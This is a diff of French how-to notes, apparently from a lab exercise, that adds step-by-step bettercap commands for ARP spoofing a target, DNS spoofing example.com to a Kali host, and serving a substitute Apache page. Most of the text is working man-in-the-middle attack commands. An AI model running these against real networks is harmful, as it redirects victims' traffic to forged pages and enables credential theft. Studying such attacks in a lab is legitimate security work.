@@ -10,7 +10,7 @@ $ sudo bettercap
 
 >>> mise en place du dns spoofing.
 » set dns.spoof.all true				> dns spoofing activé sur toutes les requetes.
-» set dns.spoof.domains example.com,*.example.com		> on définit la liste des domaines à usurper.
+» set dns.spoof.domains example.com,*.example.com	> on définit la liste des domaines à usurper.
 » set dns.spoof.address <ip_kali>			> on définit la machine quiva faire office de DNS.
 » dns.spoof on						> on démarre le dns spoofing.
 
@@ -37,6 +37,26 @@ $ sudo service apache2 start
 >@
 >@#################################################################################
 >@
+>@* Flush des tables iptables
+>@$ sudo iptables -F -t nat
+>@
+>@* Bettercap
+>@» set arp.spoof.fullduplex true
+>@» set arp.spoof.targets <ip cible>
+>@» arp.spoof on
+>@
+>@
+>@» set dns.spoof.all true				
+>@» set dns.spoof.domains example.com,*.example.com
+>@» set dns.spoof.address <ip_kali>		
+>@» dns.spoof on			
+>@
+>@* Serveur apache sur kali
+>@$ sudo service apache2 start
+>@---> modififiez la page index.htm dans /var/www/html/index.html
+>@
+>@* Generation de certificat
+>@---> voir fichier howto-037-dns-spoofing.txt
 >@
 >@#################################################################################
 >@
